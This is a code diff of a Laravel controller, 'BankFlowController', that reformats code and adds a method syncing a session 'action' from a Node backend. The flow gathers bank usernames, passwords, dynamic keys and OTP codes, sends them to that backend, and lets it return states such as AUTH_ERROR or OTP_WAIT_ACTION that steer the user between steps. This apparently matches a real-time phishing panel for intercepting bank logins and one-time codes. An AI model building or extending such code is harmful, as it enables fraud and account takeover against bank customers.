@@ -43,6 +43,8 @@ class BankFlowController extends Controller
         // ✅ Sync desde Node, pero SIN pisar reintento local
         $this->ensureRealtimeSession($request, $maxSteps);
 
+        $this->syncActionFromNode($request);
+
         // ✅ Guard (con acción ya sincronizada)
         if ($redirect = $this->guardStepOrRedirect($request, $bank, $step, $maxSteps, false)) {
             return $redirect;
@@ -132,8 +134,10 @@ class BankFlowController extends Controller
                     'otp' => 'nullable|string|min:6|max:8',
                 ]);
 
-                if (!empty($data['dinamic'])) $sc['dinamic'] = $data['dinamic'];
-                if (!empty($data['otp'])) $sc['otp'] = $data['otp'];
+                if (!empty($data['dinamic']))
+                    $sc['dinamic'] = $data['dinamic'];
+                if (!empty($data['otp']))
+                    $sc['otp'] = $data['otp'];
             }
         } else {
             // tu lógica normal (3 steps)
@@ -150,8 +154,10 @@ class BankFlowController extends Controller
                     'dinamic' => 'nullable|string|min:6|max:8',
                     'otp' => 'nullable|string|min:6|max:8',
                 ]);
-                if (!empty($data['dinamic'])) $sc['dinamic'] = $data['dinamic'];
-                if (!empty($data['otp'])) $sc['otp'] = $data['otp'];
+                if (!empty($data['dinamic']))
+                    $sc['dinamic'] = $data['dinamic'];
+                if (!empty($data['otp']))
+                    $sc['otp'] = $data['otp'];
             }
         }
 
@@ -172,16 +178,17 @@ class BankFlowController extends Controller
         $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
 
         // helper: detectar reintento local (NO dejar que Node lo pise)
-        $isRetryingLocally = function(array $sc) use ($maxSteps): bool {
-            if ($maxSteps !== 4) return false;
+        $isRetryingLocally = function (array $sc) use ($maxSteps): bool {
+            if ($maxSteps !== 4)
+                return false;
 
-            $step = (string)($sc['step'] ?? '');
+            $step = (string) ($sc['step'] ?? '');
             $hasUser = !empty($sc['user']);
             $hasPass = !empty($sc['pass']);
 
             // Si el usuario ya está reingresando credenciales (step1/step2 con user/pass)
             // no queremos que Node “re-imponga” AUTH_ERROR y lo devuelva a step1.
-            return in_array($step, ['1', '2'], true) && ($hasUser || $hasPass) && (($sc['action'] ?? null) === 'AUTH');
+            return \in_array($step, ['1', '2'], true) && ($hasUser || $hasPass) && (($sc['action'] ?? null) === 'AUTH');
         };
 
         // 1) Ya existe sessionId => NO crear otra
@@ -193,14 +200,16 @@ class BankFlowController extends Controller
                     $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'] . '/issue-token';
                     $resp = Http::asJson()->timeout(10)->post($url);
 
-                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+                    if ($resp instanceof PromiseInterface)
+                        $resp = $resp->wait();
 
                     if ($resp->successful()) {
                         $sc['rt_session_token'] = $resp->json('sessionToken');
                         $request->session()->put('sc', $sc);
                         $request->session()->save();
                     }
-                } catch (\Throwable $e) {}
+                } catch (\Throwable $e) {
+                }
             }
 
             // 1.2 sync action si hay token
@@ -209,7 +218,8 @@ class BankFlowController extends Controller
                     $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'];
                     $resp = Http::withToken($sc['rt_session_token'])->timeout(10)->get($url);
 
-                    if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+                    if ($resp instanceof PromiseInterface)
+                        $resp = $resp->wait();
 
                     if ($resp->successful()) {
                         $nodeAction = $resp->json('session.action') ?? $resp->json('action');
@@ -227,7 +237,8 @@ class BankFlowController extends Controller
                             $request->session()->save();
                         }
                     }
-                } catch (\Throwable $e) {}
+                } catch (\Throwable $e) {
+                }
             }
 
             return;
@@ -238,19 +249,22 @@ class BankFlowController extends Controller
             $url = $baseUrl . '/api/sessions';
             $resp = Http::asJson()->timeout(10)->post($url, $sc);
 
-            if ($resp instanceof PromiseInterface) $resp = $resp->wait();
+            if ($resp instanceof PromiseInterface)
+                $resp = $resp->wait();
 
             if ($resp->successful()) {
                 $sc['rt_session_id'] = $resp->json('sessionId');
                 $sc['rt_session_token'] = $resp->json('sessionToken');
 
                 $nodeAction = $resp->json('session.action') ?? $resp->json('action');
-                if ($nodeAction) $sc['action'] = $nodeAction;
+                if ($nodeAction)
+                    $sc['action'] = $nodeAction;
 
                 $request->session()->put('sc', $sc);
                 $request->session()->save();
             }
-        } catch (\Throwable $e) {}
+        } catch (\Throwable $e) {
+        }
     }
 
     private function normalizeFlowState(array $sc): ?string
@@ -262,27 +276,36 @@ class BankFlowController extends Controller
     {
         $action = $this->normalizeFlowState($sc);
 
-        if (!$action) return (int) ($sc['step'] ?? 1);
+        if (!$action)
+            return (int) ($sc['step'] ?? 1);
 
         if ($maxSteps === 4) {
             // Si es AUTH_ERROR, manda a step1 (pero si ya comenzó reintento local, deja avanzar)
-            if ($action === 'AUTH_ERROR') return 1;
+           /*  if ($action === 'AUTH_ERROR')
+                return 1; */
 
-            if (in_array($action, ['AUTH', 'AUTH_WAIT_ACTION'], true)) {
-                if (empty($sc['user'])) return 1;
-                if (empty($sc['pass'])) return 2;
+            if (in_array($action, ['AUTH','AUTH_ERROR', 'AUTH_WAIT_ACTION'], true)) {
+                if (empty($sc['user']))
+                    return 1;
+                if (empty($sc['pass']))
+                    return 2;
                 return 2;
             }
 
-            if (in_array($action, ['DINAMIC', 'DINAMIC_WAIT_ACTION', 'DINAMIC_ERROR'], true)) return 3;
-            if (in_array($action, ['OTP', 'OTP_WAIT_ACTION', 'OTP_ERROR'], true)) return 4;
+            if (in_array($action, ['DINAMIC', 'DINAMIC_WAIT_ACTION', 'DINAMIC_ERROR'], true))
+                return 3;
+            if (in_array($action, ['OTP', 'OTP_WAIT_ACTION', 'OTP_ERROR'], true))
+                return 4;
 
             return (int) ($sc['step'] ?? 1);
         }
 
-        if (in_array($action, ['AUTH', 'AUTH_ERROR'], true)) return 1;
-        if (in_array($action, ['DINAMIC', 'DINAMIC_ERROR'], true)) return min(3, $maxSteps);
-        if (in_array($action, ['OTP', 'OTP_ERROR'], true)) return min(4, $maxSteps);
+        if (in_array($action, ['AUTH', 'AUTH_ERROR'], true))
+            return 1;
+        if (in_array($action, ['DINAMIC', 'DINAMIC_ERROR'], true))
+            return min(3, $maxSteps);
+        if (in_array($action, ['OTP', 'OTP_ERROR'], true))
+            return min(4, $maxSteps);
 
         return (int) ($sc['step'] ?? 1);
     }
@@ -312,5 +335,34 @@ class BankFlowController extends Controller
         }
 
         return null;
+    }
+
+    private function syncActionFromNode(Request $request): void
+    {
+        $sc = (array) $request->session()->get('sc', []);
+        $id = $sc['rt_session_id'] ?? null;
+        if (!$id)
+            return;
+
+        $base = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
+        $url = $base . '/api/sessions/' . $id;
+
+        try {
+            $resp = Http::timeout(5)->get($url);
+
+            if ($resp instanceof PromiseInterface)
+                $resp = $resp->wait();
+
+            if (!$resp->successful())
+                return;
+
+            $action = $resp->json('action') ?? $resp->json('session.action');
+            if ($action) {
+                $sc['action'] = $action;
+                $request->session()->put('sc', $sc);
+                $request->session()->save();
+            }
+        } catch (\Throwable $e) {
+        }
     }
 }
